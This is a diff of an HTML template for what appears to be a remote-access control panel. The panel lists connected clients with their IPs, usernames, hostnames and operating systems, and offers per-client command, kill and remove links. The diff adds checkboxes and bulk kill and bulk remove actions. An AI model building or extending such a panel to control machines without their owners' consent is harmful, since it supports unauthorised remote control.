@@ -34,48 +34,61 @@
       <h2 align=center>Current clients</h2>
       <hr>
 
-      {{ range .Clients }}
-      <table border=1>
-        <tr>
-          <td id="bold">ID</td>
-          <td id="bold">Status</td>
-          <td id="bold">Remote IP</td>
-          <td id="bold">Local IP</td>
-          <td id="bold">Username</td>
-          <td id="bold">Hostname</td>
-          <td id="bold">Operating System</td>
-          <td rowspan=2>
-            <a target="_blank" href="command/{{ .ClientID }}"><b>CMD</b></a>
-          </td>
-          <td rowspan=2>
-            <a href="/" hx-post="kill/{{ .ClientID }}" hx-swap="none" id="pointer"><b>KILL</b></a>
-          </td>
-          <td rowspan=2>
-            <a href="/" hx-post="remove/{{ .ClientID }}" hx-swap="none" id="pointer"><b>REMOVE</b></a>
-          </td>
-        </tr>
-        <tr>
-          <td>{{ .ClientID }}</td>
-          <td>
-            {{ if .IsOnline }}
-            <on>
-              OK
-            </on>
-            {{ else }}
-            <off>
-              Offline
-            </off>
-            {{ end }}
-          </td>
-          <td>{{ .ClientBasicInfo.PublicIP }}</td>
-          <td>{{ .ClientBasicInfo.LocalIP }}</td>
-          <td>{{ .ClientBasicInfo.Username }}</td>
-          <td>{{ .ClientBasicInfo.Hostname }}</td>
-          <td>{{ .ClientBasicInfo.OperatingSystem }}</td>
-        </tr>
-      </table>
-      <hr>
-      {{ end }}
+      <form>
+        {{ range .Clients }}
+        <table border=1>
+          <tr>
+            <td id="bold" rowspan="2"><input type="checkbox" name="clients[]" value="{{ .ClientID }}"></td>
+            <td id="bold">ID</td>
+            <td id="bold">Status</td>
+            <td id="bold">Remote IP</td>
+            <td id="bold">Local IP</td>
+            <td id="bold">Username</td>
+            <td id="bold">Hostname</td>
+            <td id="bold">Operating System</td>
+            <td rowspan=2>
+              <a target="_blank" href="command/{{ .ClientID }}"><b>CMD</b></a>
+            </td>
+            <td rowspan=2>
+              <a href="/" hx-post="kill/{{ .ClientID }}" hx-swap="none" id="pointer"><b>KILL</b></a>
+            </td>
+            <td rowspan=2>
+              <a href="/" hx-post="remove/{{ .ClientID }}" hx-swap="none" id="pointer"><b>REMOVE</b></a>
+            </td>
+          </tr>
+          <tr>
+            <td>{{ .ClientID }}</td>
+            <td>
+              {{ if .IsOnline }}
+              <on>
+                OK
+              </on>
+              {{ else }}
+              <off>
+                Offline
+              </off>
+              {{ end }}
+            </td>
+            <td>{{ .ClientBasicInfo.PublicIP }}</td>
+            <td>{{ .ClientBasicInfo.LocalIP }}</td>
+            <td>{{ .ClientBasicInfo.Username }}</td>
+            <td>{{ .ClientBasicInfo.Hostname }}</td>
+            <td>{{ .ClientBasicInfo.OperatingSystem }}</td>
+          </tr>
+        </table>
+        <hr>
+        {{ end }}
+        <b>
+          <ul>
+            <li class="hor">
+              <p><a hx-post="/bulk-kill" hx-swap="none" target="_blank" id="pointer">Bulk kill</a></p>
+            </li>
+            <li class="hor">
+              <p><a hx-post="/bulk-remove" hx-swap="none" target="_blank" id="pointer">Bulk remove</a></p>
+            </li>
+          </ul>
+        </b>
+      </form>
     </div>
   </div>
 </body>
